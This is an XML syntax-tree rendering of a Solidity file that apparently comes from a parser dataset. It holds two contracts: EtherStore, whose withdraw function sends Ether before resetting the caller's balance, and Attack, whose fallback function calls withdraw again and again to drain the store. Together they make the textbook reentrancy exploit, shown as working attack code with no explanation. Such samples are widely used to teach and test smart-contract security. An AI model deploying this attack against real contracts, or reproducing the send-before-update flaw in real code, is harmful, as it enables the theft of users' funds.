<sourceUnit>
  <pragmaDirective>
    <token>pragma</token>
    <pragmaName>
      <identifier>
        <token>solidity</token>
      </identifier>
    </pragmaName>
    <pragmaValue>
      <version>
        <versionConstraint>
          <versionOperator>
            <token>^</token>
          </versionOperator>
          <token>0.8.13</token>
        </versionConstraint>
      </version>
    </pragmaValue>
    <token>;</token>
  </pragmaDirective>
  <contractDefinition>
    <token>contract</token>
    <identifier>
      <token>EtherStore</token>
    </identifier>
    <token>{</token>
    <contractPart>
      <stateVariableDeclaration>
        <typeName>
          <mapping>
            <token>mapping</token>
            <token>(</token>
            <mappingKey>
              <elementaryTypeName>
                <token>address</token>
              </elementaryTypeName>
            </mappingKey>
            <token>=&gt;</token>
            <typeName>
              <elementaryTypeName>
                <token>uint</token>
              </elementaryTypeName>
            </typeName>
            <token>)</token>
          </mapping>
        </typeName>
        <token>public</token>
        <identifier>
          <token>balances</token>
        </identifier>
        <token>;</token>
      </stateVariableDeclaration>
    </contractPart>
    <contractPart>
      <functionDefinition>
        <functionDescriptor>
          <token>function</token>
          <identifier>
            <token>deposit</token>
          </identifier>
        </functionDescriptor>
        <parameterList>
          <token>(</token>
          <token>)</token>
        </parameterList>
        <modifierList>
          <token>public</token>
          <stateMutability>
            <token>payable</token>
          </stateMutability>
        </modifierList>
        <block>
          <token>{</token>
          <statement>
            <simpleStatement>
              <expressionStatement>
                <expression>
                  <expression>
                    <expression>
                      <primaryExpression>
                        <identifier>
                          <token>balances</token>
                        </identifier>
                      </primaryExpression>
                    </expression>
                    <token>[</token>
                    <expression>
                      <expression>
                        <primaryExpression>
                          <identifier>
                            <token>msg</token>
                          </identifier>
                        </primaryExpression>
                      </expression>
                      <token>.</token>
                      <identifier>
                        <token>sender</token>
                      </identifier>
                    </expression>
                    <token>]</token>
                  </expression>
                  <token>+=</token>
                  <expression>
                    <expression>
                      <primaryExpression>
                        <identifier>
                          <token>msg</token>
                        </identifier>
                      </primaryExpression>
                    </expression>
                    <token>.</token>
                    <identifier>
                      <token>value</token>
                    </identifier>
                  </expression>
                </expression>
                <token>;</token>
              </expressionStatement>
            </simpleStatement>
          </statement>
          <token>}</token>
        </block>
      </functionDefinition>
    </contractPart>
    <contractPart>
      <functionDefinition>
        <functionDescriptor>
          <token>function</token>
          <identifier>
            <token>withdraw</token>
          </identifier>
        </functionDescriptor>
        <parameterList>
          <token>(</token>
          <token>)</token>
        </parameterList>
        <modifierList>
          <token>public</token>
        </modifierList>
        <block>
          <token>{</token>
          <statement>
            <simpleStatement>
              <variableDeclarationStatement>
                <variableDeclaration>
                  <typeName>
                    <elementaryTypeName>
                      <token>uint</token>
                    </elementaryTypeName>
                  </typeName>
                  <identifier>
                    <token>bal</token>
                  </identifier>
                </variableDeclaration>
                <token>=</token>
                <expression>
                  <expression>
                    <primaryExpression>
                      <identifier>
                        <token>balances</token>
                      </identifier>
                    </primaryExpression>
                  </expression>
                  <token>[</token>
                  <expression>
                    <expression>
                      <primaryExpression>
                        <identifier>
                          <token>msg</token>
                        </identifier>
                      </primaryExpression>
                    </expression>
                    <token>.</token>
                    <identifier>
                      <token>sender</token>
                    </identifier>
                  </expression>
                  <token>]</token>
                </expression>
                <token>;</token>
              </variableDeclarationStatement>
            </simpleStatement>
          </statement>
          <statement>
            <simpleStatement>
              <expressionStatement>
                <expression>
                  <expression>
                    <primaryExpression>
                      <identifier>
                        <token>require</token>
                      </identifier>
                    </primaryExpression>
                  </expression>
                  <token>(</token>
                  <functionCallArguments>
                    <expressionList>
                      <expression>
                        <expression>
                          <primaryExpression>
                            <identifier>
                              <token>bal</token>
                            </identifier>
                          </primaryExpression>
                        </expression>
                        <token>&gt;</token>
                        <expression>
                          <primaryExpression>
                            <numberLiteral>
                              <token>0</token>
                            </numberLiteral>
                          </primaryExpression>
                        </expression>
                      </expression>
                    </expressionList>
                  </functionCallArguments>
                  <token>)</token>
                </expression>
                <token>;</token>
              </expressionStatement>
            </simpleStatement>
          </statement>
          <statement>
            <simpleStatement>
              <variableDeclarationStatement>
                <token>(</token>
                <variableDeclarationList>
                  <variableDeclaration>
                    <typeName>
                      <elementaryTypeName>
                        <token>bool</token>
                      </elementaryTypeName>
                    </typeName>
                    <identifier>
                      <token>sent</token>
                    </identifier>
                  </variableDeclaration>
                  <token>,</token>
                </variableDeclarationList>
                <token>)</token>
                <token>=</token>
                <expression>
                  <expression>
                    <expression>
                      <expression>
                        <expression>
                          <primaryExpression>
                            <identifier>
                              <token>msg</token>
                            </identifier>
                          </primaryExpression>
                        </expression>
                        <token>.</token>
                        <identifier>
                          <token>sender</token>
                        </identifier>
                      </expression>
                      <token>.</token>
                      <identifier>
                        <token>call</token>
                      </identifier>
                    </expression>
                    <token>{</token>
                    <nameValueList>
                      <nameValue>
                        <identifier>
                          <token>value</token>
                        </identifier>
                        <token>:</token>
                        <expression>
                          <primaryExpression>
                            <identifier>
                              <token>bal</token>
                            </identifier>
                          </primaryExpression>
                        </expression>
                      </nameValue>
                    </nameValueList>
                    <token>}</token>
                  </expression>
                  <token>(</token>
                  <functionCallArguments>
                    <expressionList>
                      <expression>
                        <primaryExpression>
                          <stringLiteral>
                            <token>&quot;&quot;</token>
                          </stringLiteral>
                        </primaryExpression>
                      </expression>
                    </expressionList>
                  </functionCallArguments>
                  <token>)</token>
                </expression>
                <token>;</token>
              </variableDeclarationStatement>
            </simpleStatement>
          </statement>
          <statement>
            <simpleStatement>
              <expressionStatement>
                <expression>
                  <expression>
                    <expression>
                      <primaryExpression>
                        <identifier>
                          <token>balances</token>
                        </identifier>
                      </primaryExpression>
                    </expression>
                    <token>[</token>
                    <expression>
                      <expression>
                        <primaryExpression>
                          <identifier>
                            <token>msg</token>
                          </identifier>
                        </primaryExpression>
                      </expression>
                      <token>.</token>
                      <identifier>
                        <token>sender</token>
                      </identifier>
                    </expression>
                    <token>]</token>
                  </expression>
                  <token>=</token>
                  <expression>
                    <primaryExpression>
                      <numberLiteral>
                        <token>0</token>
                      </numberLiteral>
                    </primaryExpression>
                  </expression>
                </expression>
                <token>;</token>
              </expressionStatement>
            </simpleStatement>
          </statement>
          <statement>
            <simpleStatement>
              <expressionStatement>
                <expression>
                  <expression>
                    <primaryExpression>
                      <identifier>
                        <token>require</token>
                      </identifier>
                    </primaryExpression>
                  </expression>
                  <token>(</token>
                  <functionCallArguments>
                    <expressionList>
                      <expression>
                        <primaryExpression>
                          <identifier>
                            <token>sent</token>
                          </identifier>
                        </primaryExpression>
                      </expression>
                      <token>,</token>
                      <expression>
                        <primaryExpression>
                          <stringLiteral>
                            <token>&quot;Failed to send Ether&quot;</token>
                          </stringLiteral>
                        </primaryExpression>
                      </expression>
                    </expressionList>
                  </functionCallArguments>
                  <token>)</token>
                </expression>
                <token>;</token>
              </expressionStatement>
            </simpleStatement>
          </statement>
          <token>}</token>
        </block>
      </functionDefinition>
    </contractPart>
    <contractPart>
      <functionDefinition>
        <functionDescriptor>
          <token>function</token>
          <identifier>
            <token>getBalance</token>
          </identifier>
        </functionDescriptor>
        <parameterList>
          <token>(</token>
          <token>)</token>
        </parameterList>
        <modifierList>
          <token>public</token>
          <stateMutability>
            <token>view</token>
          </stateMutability>
        </modifierList>
        <returnParameters>
          <token>returns</token>
          <parameterList>
            <token>(</token>
            <parameter>
              <typeName>
                <elementaryTypeName>
                  <token>uint</token>
                </elementaryTypeName>
              </typeName>
            </parameter>
            <token>)</token>
          </parameterList>
        </returnParameters>
        <block>
          <token>{</token>
          <statement>
            <returnStatement>
              <token>return</token>
              <expression>
                <expression>
                  <expression>
                    <primaryExpression>
                      <identifier>
                        <token>address</token>
                      </identifier>
                    </primaryExpression>
                  </expression>
                  <token>(</token>
                  <functionCallArguments>
                    <expressionList>
                      <expression>
                        <primaryExpression>
                          <identifier>
                            <token>this</token>
                          </identifier>
                        </primaryExpression>
                      </expression>
                    </expressionList>
                  </functionCallArguments>
                  <token>)</token>
                </expression>
                <token>.</token>
                <identifier>
                  <token>balance</token>
                </identifier>
              </expression>
              <token>;</token>
            </returnStatement>
          </statement>
          <token>}</token>
        </block>
      </functionDefinition>
    </contractPart>
    <token>}</token>
  </contractDefinition>
  <contractDefinition>
    <token>contract</token>
    <identifier>
      <token>Attack</token>
    </identifier>
    <token>{</token>
    <contractPart>
      <stateVariableDeclaration>
        <typeName>
          <userDefinedTypeName>
            <identifier>
              <token>EtherStore</token>
            </identifier>
          </userDefinedTypeName>
        </typeName>
        <token>public</token>
        <identifier>
          <token>etherStore</token>
        </identifier>
        <token>;</token>
      </stateVariableDeclaration>
    </contractPart>
    <contractPart>
      <functionDefinition>
        <functionDescriptor>
          <token>constructor</token>
        </functionDescriptor>
        <parameterList>
          <token>(</token>
          <parameter>
            <typeName>
              <elementaryTypeName>
                <token>address</token>
              </elementaryTypeName>
            </typeName>
            <identifier>
              <token>_etherStoreAddress</token>
            </identifier>
          </parameter>
          <token>)</token>
        </parameterList>
        <modifierList></modifierList>
        <block>
          <token>{</token>
          <statement>
            <simpleStatement>
              <expressionStatement>
                <expression>
                  <expression>
                    <primaryExpression>
                      <identifier>
                        <token>etherStore</token>
                      </identifier>
                    </primaryExpression>
                  </expression>
                  <token>=</token>
                  <expression>
                    <expression>
                      <primaryExpression>
                        <identifier>
                          <token>EtherStore</token>
                        </identifier>
                      </primaryExpression>
                    </expression>
                    <token>(</token>
                    <functionCallArguments>
                      <expressionList>
                        <expression>
                          <primaryExpression>
                            <identifier>
                              <token>_etherStoreAddress</token>
                            </identifier>
                          </primaryExpression>
                        </expression>
                      </expressionList>
                    </functionCallArguments>
                    <token>)</token>
                  </expression>
                </expression>
                <token>;</token>
              </expressionStatement>
            </simpleStatement>
          </statement>
          <token>}</token>
        </block>
      </functionDefinition>
    </contractPart>
    <contractPart>
      <functionDefinition>
        <functionDescriptor>
          <token>fallback</token>
        </functionDescriptor>
        <parameterList>
          <token>(</token>
          <token>)</token>
        </parameterList>
        <modifierList>
          <token>external</token>
          <stateMutability>
            <token>payable</token>
          </stateMutability>
        </modifierList>
        <block>
          <token>{</token>
          <statement>
            <ifStatement>
              <token>if</token>
              <token>(</token>
              <expression>
                <expression>
                  <expression>
                    <expression>
                      <primaryExpression>
                        <identifier>
                          <token>address</token>
                        </identifier>
                      </primaryExpression>
                    </expression>
                    <token>(</token>
                    <functionCallArguments>
                      <expressionList>
                        <expression>
                          <primaryExpression>
                            <identifier>
                              <token>etherStore</token>
                            </identifier>
                          </primaryExpression>
                        </expression>
                      </expressionList>
                    </functionCallArguments>
                    <token>)</token>
                  </expression>
                  <token>.</token>
                  <identifier>
                    <token>balance</token>
                  </identifier>
                </expression>
                <token>&gt;=</token>
                <expression>
                  <primaryExpression>
                    <numberLiteral>
                      <token>1</token>
                      <token>ether</token>
                    </numberLiteral>
                  </primaryExpression>
                </expression>
              </expression>
              <token>)</token>
              <statement>
                <block>
                  <token>{</token>
                  <statement>
                    <simpleStatement>
                      <expressionStatement>
                        <expression>
                          <expression>
                            <expression>
                              <primaryExpression>
                                <identifier>
                                  <token>etherStore</token>
                                </identifier>
                              </primaryExpression>
                            </expression>
                            <token>.</token>
                            <identifier>
                              <token>withdraw</token>
                            </identifier>
                          </expression>
                          <token>(</token>
                          <functionCallArguments></functionCallArguments>
                          <token>)</token>
                        </expression>
                        <token>;</token>
                      </expressionStatement>
                    </simpleStatement>
                  </statement>
                  <token>}</token>
                </block>
              </statement>
            </ifStatement>
          </statement>
          <token>}</token>
        </block>
      </functionDefinition>
    </contractPart>
    <contractPart>
      <functionDefinition>
        <functionDescriptor>
          <token>function</token>
          <identifier>
            <token>attack</token>
          </identifier>
        </functionDescriptor>
        <parameterList>
          <token>(</token>
          <token>)</token>
        </parameterList>
        <modifierList>
          <token>external</token>
          <stateMutability>
            <token>payable</token>
          </stateMutability>
        </modifierList>
        <block>
          <token>{</token>
          <statement>
            <simpleStatement>
              <expressionStatement>
                <expression>
                  <expression>
                    <primaryExpression>
                      <identifier>
                        <token>require</token>
                      </identifier>
                    </primaryExpression>
                  </expression>
                  <token>(</token>
                  <functionCallArguments>
                    <expressionList>
                      <expression>
                        <expression>
                          <expression>
                            <primaryExpression>
                              <identifier>
                                <token>msg</token>
                              </identifier>
                            </primaryExpression>
                          </expression>
                          <token>.</token>
                          <identifier>
                            <token>value</token>
                          </identifier>
                        </expression>
                        <token>&gt;=</token>
                        <expression>
                          <primaryExpression>
                            <numberLiteral>
                              <token>1</token>
                              <token>ether</token>
                            </numberLiteral>
                          </primaryExpression>
                        </expression>
                      </expression>
                    </expressionList>
                  </functionCallArguments>
                  <token>)</token>
                </expression>
                <token>;</token>
              </expressionStatement>
            </simpleStatement>
          </statement>
          <statement>
            <simpleStatement>
              <expressionStatement>
                <expression>
                  <expression>
                    <expression>
                      <expression>
                        <primaryExpression>
                          <identifier>
                            <token>etherStore</token>
                          </identifier>
                        </primaryExpression>
                      </expression>
                      <token>.</token>
                      <identifier>
                        <token>deposit</token>
                      </identifier>
                    </expression>
                    <token>{</token>
                    <nameValueList>
                      <nameValue>
                        <identifier>
                          <token>value</token>
                        </identifier>
                        <token>:</token>
                        <expression>
                          <primaryExpression>
                            <numberLiteral>
                              <token>1</token>
                              <token>ether</token>
                            </numberLiteral>
                          </primaryExpression>
                        </expression>
                      </nameValue>
                    </nameValueList>
                    <token>}</token>
                  </expression>
                  <token>(</token>
                  <functionCallArguments></functionCallArguments>
                  <token>)</token>
                </expression>
                <token>;</token>
              </expressionStatement>
            </simpleStatement>
          </statement>
          <statement>
            <simpleStatement>
              <expressionStatement>
                <expression>
                  <expression>
                    <expression>
                      <primaryExpression>
                        <identifier>
                          <token>etherStore</token>
                        </identifier>
                      </primaryExpression>
                    </expression>
                    <token>.</token>
                    <identifier>
                      <token>withdraw</token>
                    </identifier>
                  </expression>
                  <token>(</token>
                  <functionCallArguments></functionCallArguments>
                  <token>)</token>
                </expression>
                <token>;</token>
              </expressionStatement>
            </simpleStatement>
          </statement>
          <token>}</token>
        </block>
      </functionDefinition>
    </contractPart>
    <contractPart>
      <functionDefinition>
        <functionDescriptor>
          <token>function</token>
          <identifier>
            <token>getBalance</token>
          </identifier>
        </functionDescriptor>
        <parameterList>
          <token>(</token>
          <token>)</token>
        </parameterList>
        <modifierList>
          <token>public</token>
          <stateMutability>
            <token>view</token>
          </stateMutability>
        </modifierList>
        <returnParameters>
          <token>returns</token>
          <parameterList>
            <token>(</token>
            <parameter>
              <typeName>
                <elementaryTypeName>
                  <token>uint</token>
                </elementaryTypeName>
              </typeName>
            </parameter>
            <token>)</token>
          </parameterList>
        </returnParameters>
        <block>
          <token>{</token>
          <statement>
            <returnStatement>
              <token>return</token>
              <expression>
                <expression>
                  <expression>
                    <primaryExpression>
                      <identifier>
                        <token>address</token>
                      </identifier>
                    </primaryExpression>
                  </expression>
                  <token>(</token>
                  <functionCallArguments>
                    <expressionList>
                      <expression>
                        <primaryExpression>
                          <identifier>
                            <token>this</token>
                          </identifier>
                        </primaryExpression>
                      </expression>
                    </expressionList>
                  </functionCallArguments>
                  <token>)</token>
                </expression>
                <token>.</token>
                <identifier>
                  <token>balance</token>
                </identifier>
              </expression>
              <token>;</token>
            </returnStatement>
          </statement>
          <token>}</token>
        </block>
      </functionDefinition>
    </contractPart>
    <token>}</token>
  </contractDefinition>
  <token>&lt;EOF&gt;</token>
</sourceUnit>